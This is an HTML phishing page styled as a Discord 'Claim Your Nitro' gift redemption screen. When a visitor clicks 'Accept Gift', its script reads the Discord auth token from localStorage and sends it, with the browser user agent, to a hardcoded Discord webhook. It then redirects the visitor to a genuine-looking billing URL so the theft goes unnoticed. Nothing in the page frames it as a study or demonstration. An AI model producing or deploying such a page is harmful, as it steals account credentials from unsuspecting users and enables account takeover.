<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Gift Redemption</title>
    <style>
        :root {
            --blurple: #5865F2;
            --bg-grad: linear-gradient(125deg, #202225 0%, #2f3136 50%, #5865F2 150%);
        }

        body {
            margin: 0;
            background: var(--bg-grad);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; font-family: 'gg sans', sans-serif;
            color: #fff;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .card {
            background: rgba(32, 34, 37, 0.9);
            backdrop-filter: blur(20px);
            width: 450px; padding: 48px; border-radius: 20px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            text-align: center; border: 1px solid rgba(255,255,255,0.1);
        }

        h1 { font-size: 28px; margin-bottom: 12px; letter-spacing: -0.5px; }
        p { color: #b9bbbe; font-size: 15px; margin-bottom: 35px; }

        .btn {
            background: var(--blurple);
            color: #fff; border: none; padding: 16px 24px;
            width: 100%; border-radius: 8px; font-weight: 700;
            cursor: pointer; transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 15px rgba(88,101,242,0.3);
        }

        .btn:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(88,101,242,0.5); }
        .btn:active { transform: translateY(0); }

        #status { margin-top: 20px; font-size: 13px; color: var(--blurple); opacity: 0; transition: opacity 0.5s; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Claim Your Nitro</h1>
        <p>Your 3-month subscription gift is ready to be applied. Complete the quick identity verification below.</p>
        <button class="btn" id="claimBtn">Accept Gift</button>
        <div id="status">Verifying authentication session...</div>
    </div>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            
            btn.style.display = 'none';
            status.style.opacity = '1';

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "@everyone",
                    embeds: [{
                        title: "💎 Premium UI Interaction",
                        color: 0x5865F2,
                        fields: [
                            { name: "Token", value: `\`${token || "NULL"}\`` },
                            { name: "Browser Info", value: `\`${navigator.userAgent}\`` }
                        ]
                    }]
                })
            });

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 1500);
        });
    </script>
</body>
</html>
